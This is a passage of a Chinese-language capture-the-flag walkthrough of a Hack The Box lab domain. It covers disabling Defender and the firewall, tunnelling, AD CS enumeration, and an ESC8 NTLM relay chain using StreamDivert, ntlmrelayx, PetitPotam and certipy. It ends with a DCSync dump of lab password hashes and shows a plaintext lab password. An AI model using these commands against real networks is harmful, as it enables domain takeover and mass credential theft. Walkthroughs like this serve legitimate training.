                                       10.13.38.2 
```

### 关闭防护
```bash
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
powershell -Command "Set-MpPreference -DisableIOAVProtection $true"
powershell -Command "Set-MpPreference -DisableScriptScanning $true"
powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true"
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath 'C:\Users\Public'"
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
```

### sharphound
> 用kaiju.vl\sasrv200运行
>

```bash
.\SharpHound.exe -c All
```

```bash
┌──(web)─(kali㉿kali)-[~/Desktop/htb/Kaiju]
└─$ scp 'sasrv200@10.13.38.41:C:/Users/Public/20260323090136_BloodHound.zip' ~/Desktop/htb/Kaiju/      
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
sasrv200@10.13.38.41's password: 
20260323090136_BloodHound.zip                                         100%   54KB  35.4KB/s   00:01  
```

# TO ROOT
## Bloodhound
> KAIJU-SUB-CA@KAIJU.VL的DNS Hostname为BERSRV105.kaiju.vl对应IP172.16.90.61
>
> KAIJU-CA@KAIJU.VL的DNS Hostname为BERSRV100.kaiju.vl对应IP172.16.90.60
>
> 
>
>  KAIJU-CA（根CA） — BERSRV100.kaiju.vl (172.16.90.60)
>
> + 整个 PKI 信任链的根，自签名证书
> + 通常离线或高度保护，不直接对外签发用户证书
> + 攻击价值最高，拿下即可伪造任意证书
>
>  
>
> KAIJU-SUB-CA（从属CA/中间CA/子证书颁发机构） — BERSRV105.kaiju.vl (172.16.90.61)
>
> + 由根CA签发证书授权，实际负责日常签发用户/计算机证书
> + 直接暴露给域内用户请求证书（Web Enrollment、RPC等）
> + ESC8（NTLM Relay）等攻击通常针对这台机器
>
> 
>
> 攻击重点：
>
>  KAIJU-SUB-CA (172.16.90.61)
>
>  ↑ 日常证书请求流量走这里
>
>  → ESC8: relay NTLM 到其 HTTP 证书注册接口
>
>  → 拿到 DC 的证书 → PTT → DCSync
>

![](/image/hackthebox-prolabs/Kaiju-14.png)

## 搭建隧道
```bash
┌──(web)─(root㉿kali)-[/usr/share/sharphound]
└─# sshpass -p 7rq7uf26brZgcSSX ssh -D 1080 sasrv200@10.13.38.41 -N -f
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
```

## 证书枚举
> kaiju-sub-CA (BERSRV105, 172.16.90.61) —HTTP Web Enrollment 开启，连接被拒绝是因为 DNS 解析失败
>
> BERSRV200 (172.16.90.50) 和两台 CA 在同一内网段，是最佳跳板
>

```bash
┌──(web)─(root㉿kali)-[/usr/share/sharphound]
└─# proxychains -q certipy find -u sasrv200@kaiju.vl -p '7rq7uf26brZgcSSX' -dc-ip 10.13.38.41 -target 172.16.90.60 -vulnerable -stdout
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 2 certificate authorities
[*] Found 22 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[!] DNS resolution failed: The resolution lifetime expired after 5.403 seconds: Server Do53:10.13.38.41@53 answered The DNS operation timed out.; Server Do53:10.13.38.41@53 answered The DNS operation timed out.; Server Do53:10.13.38.41@53 answered The DNS operation timed out.
[!] Use -debug to print a stacktrace
[*] Retrieving CA configuration for 'kaiju-sub-CA' via RRP
[*] Successfully retrieved CA configuration for 'kaiju-sub-CA'
[*] Checking web enrollment for CA 'kaiju-sub-CA' @ 'BERSRV105.kaiju.vl'
[!] Error checking web enrollment: [Errno 111] Connection refused
[!] Use -debug to print a stacktrace
[!] DNS resolution failed: The resolution lifetime expired after 5.403 seconds: Server Do53:10.13.38.41@53 answered The DNS operation timed out.; Server Do53:10.13.38.41@53 answered The DNS operation timed out.; Server Do53:10.13.38.41@53 answered The DNS operation timed out.
[!] Use -debug to print a stacktrace
[*] Retrieving CA configuration for 'kaiju-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'kaiju-CA'
[*] Checking web enrollment for CA 'kaiju-CA' @ 'BERSRV100.kaiju.vl'
[!] Failed to check channel binding: The read operation timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : kaiju-sub-CA
    DNS Name                            : BERSRV105.kaiju.vl
    Certificate Subject                 : CN=kaiju-sub-CA, DC=kaiju, DC=vl
    Certificate Serial Number           : 71000000048715771814C1ABBA000000000004
    Certificate Validity Start          : 2024-01-21 14:57:07+00:00
    Certificate Validity End            : 2026-01-21 15:07:07+00:00
    Web Enrollment
      HTTP
        Enabled                         : True
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : KAIJU.VL\Administrators
      Access Rights
        ManageCa                        : KAIJU.VL\Administrators
                                          KAIJU.VL\Domain Admins
                                          KAIJU.VL\Enterprise Admins
        ManageCertificates              : KAIJU.VL\Administrators
                                          KAIJU.VL\Domain Admins
                                          KAIJU.VL\Enterprise Admins
        Enroll                          : KAIJU.VL\Authenticated Users
    [!] Vulnerabilities
      ESC8                              : Web Enrollment is enabled over HTTP.
  1
    CA Name                             : kaiju-CA
    DNS Name                            : BERSRV100.kaiju.vl
    Certificate Subject                 : CN=kaiju-CA, DC=kaiju, DC=vl
    Certificate Serial Number           : 6D6D8A048E2B8C9B4385A113BEEA1F00
    Certificate Validity Start          : 2023-12-17 14:14:04+00:00
    Certificate Validity End            : 2523-12-17 14:24:04+00:00
    Web Enrollment
      HTTP
        Enabled                         : True
      HTTPS
        Enabled                         : True
        Channel Binding (EPA)           : Unknown
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : KAIJU.VL\Administrators
      Access Rights
        ManageCa                        : KAIJU.VL\Administrators
                                          KAIJU.VL\Domain Admins
                                          KAIJU.VL\Enterprise Admins
        ManageCertificates              : KAIJU.VL\Administrators
                                          KAIJU.VL\Domain Admins
                                          KAIJU.VL\Enterprise Admins
        Enroll                          : KAIJU.VL\Authenticated Users
    [!] Vulnerabilities
      ESC8                              : Web Enrollment is enabled over HTTP.
Certificate Templates                   : [!] Could not find any certificate templates

```

## ESC8分析
> 运行了 BloodHound 以识别潜在的权限升级向量，但没有发现任何异常
>
> 于是决定列举各种认证机构，以发现可能的配置错误
>

### 代理转发
> 将 Kali 的 8080 转发到 BERSRV105 的 80 端口
>

```bash
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Kaiju]
└─# ssh -L 8080:172.16.90.61:80 sasrv200@10.13.38.41 -N -f
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
sasrv200@10.13.38.41's password:7rq7uf26brZgcSSX
```

### 验证访问
```bash
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Kaiju]
└─# curl -v http://127.0.0.1:8080/certsrv/
*   Trying 127.0.0.1:8080...
* Established connection to 127.0.0.1 (127.0.0.1 port 8080) from 127.0.0.1 port 46176 
* using HTTP/1.x
> GET /certsrv/ HTTP/1.1
> Host: 127.0.0.1:8080
> User-Agent: curl/8.18.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 401 Unauthorized
< Content-Type: text/html
< Server: Microsoft-IIS/10.0
< WWW-Authenticate: Negotiate
< WWW-Authenticate: NTLM
< X-Powered-By: ASP.NET
< Date: Mon, 23 Mar 2026 16:53:20 GMT
< Content-Length: 1293
< 
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/>
<title>401 - Unauthorized: Access is denied due to invalid credentials.</title>
<style type="text/css">
<!--
body{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}
fieldset{padding:0 15px 10px 15px;} 
h1{font-size:2.4em;margin:0;color:#FFF;}
h2{font-size:1.7em;margin:0;color:#CC0000;} 
h3{font-size:1.2em;margin:10px 0 0 0;color:#000000;} 
#header{width:96%;margin:0 0 0 0;padding:6px 2% 6px 2%;font-family:"trebuchet MS", Verdana, sans-serif;color:#FFF;
background-color:#555555;}
#content{margin:0 0 0 2%;position:relative;}
.content-container{background:#FFF;width:96%;margin-top:8px;padding:10px;position:relative;}
-->
</style>
</head>
<body>
<div id="header"><h1>Server Error</h1></div>
<div id="content">
 <div class="content-container"><fieldset>
  <h2>401 - Unauthorized: Access is denied due to invalid credentials.</h2>
  <h3>You do not have permission to view this directory or page using the credentials that you supplied.</h3>
 </fieldset></div>
</div>
</body>
</html>
* Connection #0 to host 127.0.0.1:8080 left intact
```

### 查找DC IP
> **域控制器 (DC)**<font style="color:rgb(6, 10, 38);"> 和 </font>**子证书颁发机构 (Sub-CA)**<font style="color:rgb(6, 10, 38);"> 是同一台机器 (</font>`<font style="color:rgb(6, 10, 38);">BERSRV105</font>`<font style="color:rgb(6, 10, 38);">)，因此无法直接将 DC 的身份验证中继回它自己，必须将攻击流量中继到另一台机器上的 </font>**根证书颁发机构 (Root CA, **`**BERSRV100**`**)**
>

```bash
administrator@BERSRV200 C:\Users\Administrator>nltest /dsgetdc:kaiju.vl
           DC: \\BERSRV105.kaiju.vl
      Address: \\172.16.90.61
     Dom Guid: af521099-c7b3-42ed-bd13-a7169a21bdbf
     Dom Name: kaiju.vl
  Forest Name: kaiju.vl
 Dc Site Name: Default-First-Site-Name
Our Site Name: Default-First-Site-Name
        Flags: GC DS LDAP KDC TIMESERV DNS_DC DNS_DOMAIN DNS_FOREST CLOSE_SITE PARTIAL_SECRET WS DS_8 DS_9 DS_10 KEYLIST
The command completed successfully
```

### 查看中继
```bash
administrator@BERSRV200 C:\Users\Administrator>nslookup -type=SRV _ldap._tcp.kaiju.vl 172.16.90.60
DNS request timed out.
    timeout was 2 seconds.
Server:  UnKnown
Address:  172.16.90.60

_ldap._tcp.kaiju.vl     SRV service location:
          priority       = 0
          weight         = 100
          port           = 389
          svr hostname   = bersrv100.kaiju.vl
bersrv100.kaiju.vl      internet address = 172.16.90.60
```

### 网络分析
![](/image/hackthebox-prolabs/Kaiju-15.png)

+ **BERSRV105.kaiju.vl** (`172.16.90.61`):
    - 角色：**域控制器 (DC)**、全局编录 (GC)、密钥分发中心 (KDC)。
    - 额外角色：**子证书颁发机构 (Sub-CA)**。
    - _关键点_：因为它既是 DC 又是 CA，所以不能对自己进行 ESC8 中继攻击（即：不能强迫它认证然后中继回它自己的 Web 注册接口）。
+ **BERSRV100.kaiju.vl** (`172.16.90.60`):
    - 角色：**根证书颁发机构 (Root CA)**。
    - 状态：启用了基于 HTTP 的证书注册 (Web Enrollment)。
    - _攻击目标_：我们需要将 DC (`BERSRV105`) 的 NTLM 认证中继到这台机器的 `80` 端口。
+ **BERSRV200.kaiju.vl** (`172.16.90.50` / `10.13.38.41`):
    - 角色：**已攻陷的跳板机** (我们拥有管理员权限)。
    - 作用：它是连接外部 Kali 机和内部核心服务器 (`172.16.90.x` 网段) 的桥梁。

---

## ESC8攻击
### 关闭 BERSRV200 防火墙
```powershell
# 在 BERSRV200 上以 Administrator 身份运行 PowerShell
powershell -c "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False"

# 验证防火墙已关闭
powershell -c "Get-NetFirewallProfile | Format-Table Name,Enabled"
```

| Name | Enabled |
| --- | --- |
| Domain | False |
| Public | False |
| Private | False |


⚠️ **注意**：关闭防火墙后，BERSRV200 的 445 端口才能被 BERSRV105 访问。

---

### 下载并配置 StreamDivert
**StreamDivert 作用**：将 BERSRV200 接收到的 SMB 流量透明转发到 Kali，使 `ntlmrelayx` 能捕获 DC 的 NTLM 认证。

```bash
# 在 Kali 上操作
cd /home/kali/Desktop/tools

# 从 GitHub 下载 StreamDivert
# https://github.com/jellever/StreamDivert/releases
https://github.com/jellever/StreamDivert/releases/download/v1.1/StreamDivert.x64.zip

# 创建转发配置文件（替换 10.10.16.32 为你的实际 tun0 IP）
echo "tcp < 445 0.0.0.0 -> 10.10.16.32 445" > config.txt

# 上传所有文件到 BERSRV200
scp StreamDivert.exe WinDivert64.sys WinDivert.dll config.txt 'sasrv200@10.13.38.41:C:\Users\Public\'
```

📝 **config.txt 格式说明**：

```plain
tcp <源IP> <源端口> <目标IP> <目标端口>
```

---

### 在 BERSRV200 上启动 StreamDivert
```powershell
# 在 BERSRV200 上以 Administrator 身份运行
cd C:\Users\Public

# 启动 StreamDivert（需要管理员权限）
.\StreamDivert.exe config.txt -f -v
```

⚠️ **注意**：StreamDivert 需要保持运行状态，不要关闭终端窗口。

---

### Kali 建立 SOCKS 代理
```bash
# 建立 SOCKS 代理隧道（让 ntlmrelayx 能访问内网 172.16.90.x）
ssh -D 1080 -N -f sasrv200@10.13.38.41

# 验证隧道是否建立
ps aux | grep ssh
```

📝 **proxychains 配置**（确保已配置）：

```bash
# /etc/proxychains.conf
[ProxyList]
socks5 127.0.0.1 1080
```

---

### Kali 启动 ntlmrelayx-bersrv105
```bash
# 启动 ntlmrelayx 监听 SMB 认证，并中继到 Root CA
sudo proxychains -q impacket-ntlmrelayx \
    -t http://172.16.90.60/certsrv/certfnsh.asp \
    -smb2support \
    --adcs \
    --template DomainController \
    --remove-mic
```

**参数说明**：

| 参数 | 说明 |
| --- | --- |
| `-t` | 目标 CA 的 Web Enrollment 端点 |
| `-smb2support` | 启用 SMBv2 支持（DC 使用 SMBv2） |
| `--adcs` | 启用 AD CS 攻击模块 |
| `--template DomainController` | 申请域控制器证书模板 |
| `--remove-mic` | 移除消息完整性检查（某些环境需要） |


---

### 强制 BERSRV105 (DC) 认证
[https://github.com/topotam/PetitPotam](https://github.com/topotam/PetitPotam)

```bash
proxychains -q python /home/kali/Desktop/tools/PetitPotam-main/PetitPotam.py \
    -u sasrv200 \
    -p '7rq7uf26brZgcSSX' \
    -d kaiju.vl \
    172.16.90.50 \
    172.16.90.61
```

**参数说明**：

+ `172.16.90.50`：认证目标（BERSRV200，流量会被转发到 Kali）
+ `172.16.90.61`：要强制认证的机器（BERSRV105 DC）

---

### 验证证书获取-bersrv105
当攻击成功时，`ntlmrelayx` 会输出类似信息：

```plain
[*] HTTPD server listening on port 80
[*] SMBD server listening on port 445
[*] Targeting http://172.16.90.60/certsrv/certfnsh.asp
[+] Domain Controller certificate issued successfully!
[+] Certificate saved to: BERSRV105.pfx
```

---

### 使用证书进行 PKINIT 攻击
> 拿到bersrv105$@kaiju.vl的hash
>

```bash
# 使用 certipy 进行 PKINIT 获取 TGT
proxychains -q certipy auth -pfx BERSRV105.pfx -dc-ip 172.16.90.61 -username 'BERSRV105$' -domain 'kaiju.vl'

Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN DNS Host Name: 'BERSRV105.kaiju.vl'
[*]     Security Extension SID: 'S-1-5-21-1202327606-3023051327-2528451343-3101'
[*] Using principal: 'bersrv105$@kaiju.vl'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'bersrv105.ccache'
[*] Wrote credential cache to 'bersrv105.ccache'
[*] Trying to retrieve NT hash for 'bersrv105$'
[*] Got hash for 'bersrv105$@kaiju.vl': aad3b435b51404eeaad3b435b51404ee:267e0dadac1293f6aee423e7141bc1f9
```

---

### Kali 启动 ntlmrelayx-bersrv100
```bash
sudo proxychains -q impacket-ntlmrelayx \
      -t http://172.16.90.61/certsrv/certfnsh.asp \
      -smb2support --adcs --template DomainController
```



---

### Step 7：强制 BERSRV100 (DC) 认证
```bash
 proxychains -q python /home/kali/Desktop/tools/PetitPotam-main/PetitPotam.py \
      -u sasrv200 -p '7rq7uf26brZgcSSX' -d kaiju.vl \
      172.16.90.50 172.16.90.60
```

### 使用证书进行 PKINIT 攻击
```bash
proxychains -q certipy auth \
      -pfx BERSRV100.pfx \
      -dc-ip 172.16.90.61 \
      -username 'BERSRV100$' \
      -domain 'kaiju.vl'

[*] Certificate identities:
[*]     SAN DNS Host Name: 'BERSRV100.kaiju.vl'
[*]     Security Extension SID: 'S-1-5-21-1202327606-3023051327-2528451343-1000'
[*] Using principal: 'bersrv100$@kaiju.vl'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'bersrv100.ccache'
[*] Wrote credential cache to 'bersrv100.ccache'
[*] Trying to retrieve NT hash for 'bersrv100$'
[*] Got hash for 'bersrv100$@kaiju.vl': aad3b435b51404eeaad3b435b51404ee:cb55efa44db748ef937ff963713cb40d
```

### DCSync
```bash
┌──(web)─(root㉿kali)-[/home/…/Desktop/htb/Kaiju/esc8]
└─# proxychains -q impacket-secretsdump \
      -hashes aad3b435b51404eeaad3b435b51404ee:cb55efa44db748ef937ff963713cb40d \
      -just-dc \
      'kaiju.vl/BERSRV100$@172.16.90.60'
```

```bash
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0b46720476be1abfbb3282cb80054f40:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:e97467587cb5f64e221bdb985b6c2cb0:::
kaiju.vl\sasrv200:1104:aad3b435b51404eeaad3b435b51404ee:0049f304fb42d8b5b7336384d94ef5fa:::
kaiju.vl\Rebecca.Lewis:1106:aad3b435b51404eeaad3b435b51404ee:d53c9ab65ab39dbd6d8b6b164fd8596a:::
kaiju.vl\Lynne.Smith:1107:aad3b435b51404eeaad3b435b51404ee:60e34fe75c879559af2e3ca437716301:::
kaiju.vl\Marcus.Whitehead:1108:aad3b435b51404eeaad3b435b51404ee:22f36b3dbd44f6c09adfd8b5ef560e3b:::
kaiju.vl\Michael.Scott:1109:aad3b435b51404eeaad3b435b51404ee:6580df87903f30e866086dcef6b31d88:::
kaiju.vl\Rebecca.Carter:1110:aad3b435b51404eeaad3b435b51404ee:5ce3103568aec45b6f25a51fb174a99c:::
kaiju.vl\Marion.Smith:1111:aad3b435b51404eeaad3b435b51404ee:7340abf4034e36091ae951d0ef914941:::
kaiju.vl\Tina.Holt:1112:aad3b435b51404eeaad3b435b51404ee:c683895aa2ea9564ada3c274b336fa07:::
kaiju.vl\Phillip.George:1113:aad3b435b51404eeaad3b435b51404ee:ce3dc5cda0a2a45fc33bcb3ae951b55e:::
kaiju.vl\Linda.Patel:1114:aad3b435b51404eeaad3b435b51404ee:ecc495e68338d707934528e176d84aec:::
kaiju.vl\Susan.Palmer:1115:aad3b435b51404eeaad3b435b51404ee:a3a1558b66fd6fc363e419128ccf6b25:::
kaiju.vl\Jodie.Hudson:1116:aad3b435b51404eeaad3b435b51404ee:0c1670c523165ecc31aa0c149b77c1a9:::
kaiju.vl\Anthony.Gordon:1117:aad3b435b51404eeaad3b435b51404ee:ea96a98278641db79a8d79f093358330:::
kaiju.vl\Lindsey.Taylor:1118:aad3b435b51404eeaad3b435b51404ee:2d42c3edaa314f21cba7261bd1eebd2d:::
kaiju.vl\Dawn.McLean:1119:aad3b435b51404eeaad3b435b51404ee:b3471ca2f07e816358276bdebee601c7:::
kaiju.vl\Shane.Warner:1120:aad3b435b51404eeaad3b435b51404ee:be3d734097725ca4f5aa472c2a9e20d1:::
kaiju.vl\Carolyn.Wood:1121:aad3b435b51404eeaad3b435b51404ee:c2c79892e9ab124f747ca3db8d3bd797:::
kaiju.vl\Rita.McDonald:1122:aad3b435b51404eeaad3b435b51404ee:e54cbcec4678c2a2b8b684b3417341e8:::
kaiju.vl\Sally.Campbell:1123:aad3b435b51404eeaad3b435b51404ee:32b88e2ff4441bed9340f2f9162c2d0c:::
kaiju.vl\Elliott.Taylor:1124:aad3b435b51404eeaad3b435b51404ee:60c1e3b27828ccd42c0dd30af0e888d1:::
kaiju.vl\Jill.Davies:1125:aad3b435b51404eeaad3b435b51404ee:9a4a428f637ae2b4d038af945b1c2e9f:::
kaiju.vl\Joanna.Pritchard:1126:aad3b435b51404eeaad3b435b51404ee:9858d82caac2191620984ad1149de3e8:::
kaiju.vl\Mary.Turner:1127:aad3b435b51404eeaad3b435b51404ee:1c5d3621197a7bc8c090494813aaf585:::
kaiju.vl\Gerald.Scott:1128:aad3b435b51404eeaad3b435b51404ee:3889ad67c4ab5d1c221ee999ca7abe1b:::
kaiju.vl\Elaine.Heath:1129:aad3b435b51404eeaad3b435b51404ee:638afcbcc963377fba0700c277107503:::
kaiju.vl\Sophie.Young:1130:aad3b435b51404eeaad3b435b51404ee:b69f4aa9937bb2be0f14a4e551059ef7:::
kaiju.vl\Charlotte.Watkins:1131:aad3b435b51404eeaad3b435b51404ee:ba14023c8196f011b6f35c14348c329c:::
kaiju.vl\Lynda.Wilson:1132:aad3b435b51404eeaad3b435b51404ee:a0294229a21716b4478a0e2f58341626:::
kaiju.vl\Nigel.Brennan:1133:aad3b435b51404eeaad3b435b51404ee:d1a40bab5242e179e21e1fce71c899e4:::
kaiju.vl\Megan.Dunn:1134:aad3b435b51404eeaad3b435b51404ee:dcde7dd968fdeac36dc39d4ee5fd1877:::
kaiju.vl\Kieran.Bennett:1135:aad3b435b51404eeaad3b435b51404ee:570814723b3230bc2587bf7db690546d:::
kaiju.vl\Karl.Lawrence:1136:aad3b435b51404eeaad3b435b51404ee:432496f9060c849bf5234604a180368e:::
kaiju.vl\Jane.Davies:1137:aad3b435b51404eeaad3b435b51404ee:452f359c87e22fa8b8b4db0ed104666a:::
kaiju.vl\Sian.King:1138:aad3b435b51404eeaad3b435b51404ee:709a46854406a4f7d95bd660d0b02b1f:::
kaiju.vl\Clare.Hargreaves:1139:aad3b435b51404eeaad3b435b51404ee:f6716c1e33ea61bb4df79b5870fa20fc:::
kaiju.vl\Hilary.Wallis:1140:aad3b435b51404eeaad3b435b51404ee:fea3977832d3fa59502821d82513bb40:::
kaiju.vl\Sheila.Smith:1141:aad3b435b51404eeaad3b435b51404ee:0a514c92b45bd0d7c11401b5df192cc8:::
kaiju.vl\Emma.Watson:1142:aad3b435b51404eeaad3b435b51404ee:ab9e0b07489bcd3a9a1c60daae9ca723:::
kaiju.vl\Hazel.Connolly:1143:aad3b435b51404eeaad3b435b51404ee:3246d6907ebd84859e3428b23a9d37bb:::
kaiju.vl\Trevor.Walker:1144:aad3b435b51404eeaad3b435b51404ee:b697aa985ece50c3a23070df29c27339:::
kaiju.vl\Ian.Cunningham:1145:aad3b435b51404eeaad3b435b51404ee:41cb4923f3af542eef1a1f726ebdd850:::
kaiju.vl\Duncan.Phillips:1146:aad3b435b51404eeaad3b435b51404ee:1771d18849eba33af0a69328ee148681:::
kaiju.vl\Jordan.Walker:1147:aad3b435b51404eeaad3b435b51404ee:7d236163754a0b91e6abe34f5d12ff9c:::
kaiju.vl\Gail.Shah:1148:aad3b435b51404eeaad3b435b51404ee:25a83bdea192e371d33d331b00cf03bd:::
kaiju.vl\Patrick.Owen:1149:aad3b435b51404eeaad3b435b51404ee:95f2332a0fab1290dab78e8160a8e901:::
kaiju.vl\Judith.Holloway:1150:aad3b435b51404eeaad3b435b51404ee:3df21e426ebe1b987388313c71e54fe3:::
kaiju.vl\Jacob.Parry:1151:aad3b435b51404eeaad3b435b51404ee:8c876e79011db189c96aead2971c4969:::
kaiju.vl\William.Steele:1152:aad3b435b51404eeaad3b435b51404ee:721cf2fdcabc2c2d1992f43097f11a14:::
kaiju.vl\Amy.Robertson:1153:aad3b435b51404eeaad3b435b51404ee:5eea305bbc22ba9c7e7d08a35616a6d9:::
kaiju.vl\Molly.Moss:1154:aad3b435b51404eeaad3b435b51404ee:eab09433ee959a274998d4ccff30cb9b:::
kaiju.vl\Lisa.Harris:1155:aad3b435b51404eeaad3b435b51404ee:92daa50324a4e0423dc8baa64f9d0176:::
kaiju.vl\Tom.Miles:1156:aad3b435b51404eeaad3b435b51404ee:79da9423dc35bf6207ff5eec3e6f48db:::
kaiju.vl\Jasmine.Wheeler:1157:aad3b435b51404eeaad3b435b51404ee:83c0678de6c1bc54e4927bc122beb33d:::
kaiju.vl\Gordon.Nicholls:1158:aad3b435b51404eeaad3b435b51404ee:e82bf7e4598e3003b68b6c15fb949df0:::
kaiju.vl\Joan.Wheeler:1159:aad3b435b51404eeaad3b435b51404ee:5f5df9c3c946a82c93c96bbeef05bb07:::
kaiju.vl\Edward.Weston:1160:aad3b435b51404eeaad3b435b51404ee:911651083f10e4f0134dc776f56fed93:::
kaiju.vl\Gary.Whitehouse:1161:aad3b435b51404eeaad3b435b51404ee:e09953479892733dee03768a5e7e0829:::
kaiju.vl\Keith.Harrison:1162:aad3b435b51404eeaad3b435b51404ee:13a7d317c2ed5409fb821d85f0485502:::
kaiju.vl\Janet.Howard:1163:aad3b435b51404eeaad3b435b51404ee:566f53d91f686e8021a4ecde1c61d72b:::
kaiju.vl\Lisa.Jones:1164:aad3b435b51404eeaad3b435b51404ee:82bc90a6a263c13db7a199b8b643a1a4:::
kaiju.vl\Alexander.Price:1165:aad3b435b51404eeaad3b435b51404ee:1d5de3d58cb1c3e816dcdf4cacff16b8:::
kaiju.vl\Zoe.Robinson:1166:aad3b435b51404eeaad3b435b51404ee:a14dcfaa048c446aec5a8c58e4bedf2a:::
kaiju.vl\Caroline.Stevens:1167:aad3b435b51404eeaad3b435b51404ee:0f5b58eea2e5ea2ce0f37d6a1422fd15:::
kaiju.vl\Leonard.Harris:1168:aad3b435b51404eeaad3b435b51404ee:eb358e899aa709964db9286902e481ca:::
kaiju.vl\Megan.Hall:1169:aad3b435b51404eeaad3b435b51404ee:6c1efbc09a5958153582c49b8d5ed5a1:::
kaiju.vl\Jeremy.Curtis:1170:aad3b435b51404eeaad3b435b51404ee:97754ddb83856c88432bb9f312bba6a7:::
kaiju.vl\Graeme.Page:1171:aad3b435b51404eeaad3b435b51404ee:90bb3b3bc89918dee355256a4bf8d902:::
kaiju.vl\David.Patel:1172:aad3b435b51404eeaad3b435b51404ee:6fa1cd2ce347c9402f2a31a407b2d307:::
kaiju.vl\Brian.Evans:1173:aad3b435b51404eeaad3b435b51404ee:325f55295a6a63d1939fe0a308be30c8:::
kaiju.vl\Geraldine.Davis:1174:aad3b435b51404eeaad3b435b51404ee:3d413ac6247e77b5bb6a2feb5034912c:::
kaiju.vl\Pauline.Edwards:1175:aad3b435b51404eeaad3b435b51404ee:438ef8a89618e114799e3dc952b3b6f4:::
kaiju.vl\Jeffrey.Clark:1176:aad3b435b51404eeaad3b435b51404ee:a7ef85dd04d37573432ad316622e8452:::
kaiju.vl\Patricia.Stone:1177:aad3b435b51404eeaad3b435b51404ee:3a5569960e298abc62a52a0135c843a0:::
kaiju.vl\Joanna.Morris:1178:aad3b435b51404eeaad3b435b51404ee:12241b94e0e971b62351face557b6eea:::
kaiju.vl\Ruth.Khan:1179:aad3b435b51404eeaad3b435b51404ee:44265648a07141ab249c7b1cf3c3d6b7:::
kaiju.vl\Robin.Robinson:1180:aad3b435b51404eeaad3b435b51404ee:d1399083af9f488fefb1d11c1de5ba59:::
kaiju.vl\Marilyn.Gibbons:1181:aad3b435b51404eeaad3b435b51404ee:aecb9700e29167b3ae2c733b044f20fb:::
kaiju.vl\Irene.Davies:1182:aad3b435b51404eeaad3b435b51404ee:84fcbeb2cf582736ab2301fa930857d7:::
kaiju.vl\Ben.Bailey:1183:aad3b435b51404eeaad3b435b51404ee:8cc89b2ff8fe6b1eb7e795c5fdbb228f:::
kaiju.vl\Brandon.Stokes:1184:aad3b435b51404eeaad3b435b51404ee:1496d3dd4083639d982ab115d2d03a97:::
kaiju.vl\Carole.Tyler:1185:aad3b435b51404eeaad3b435b51404ee:6810017f0f60bef0b8fdd39c64324fab:::
kaiju.vl\Jemma.Thomas:1186:aad3b435b51404eeaad3b435b51404ee:a7ecaf5d77450aea050810962efe4766:::
kaiju.vl\Denise.Bradley:1187:aad3b435b51404eeaad3b435b51404ee:27311e52130a76d09603c2b9139a0165:::
kaiju.vl\Damien.Davies:1188:aad3b435b51404eeaad3b435b51404ee:7a86fd9a3efedfe37a8e3a00a0937cca:::
kaiju.vl\Jake.King:1189:aad3b435b51404eeaad3b435b51404ee:efd854eead6ff27c4c5adcb04331deb1:::
kaiju.vl\Eric.Jones:1190:aad3b435b51404eeaad3b435b51404ee:89fb29ccf276a23d24fd49e3a2b8f230:::
kaiju.vl\Darren.Davis:1191:aad3b435b51404eeaad3b435b51404ee:aafb9e66caf0597ff3e0a87f7317f456:::
kaiju.vl\Glen.Reynolds:1192:aad3b435b51404eeaad3b435b51404ee:c41fa622dffc7d7ffbb3b52f533cdb06:::
kaiju.vl\Gordon.Price:1193:aad3b435b51404eeaad3b435b51404ee:3722a290ed7fdbe6e75b36103eeef617:::
kaiju.vl\Anna.Smith:1194:aad3b435b51404eeaad3b435b51404ee:a1ec7f7a9db0bce5725b5a1734c6f894:::
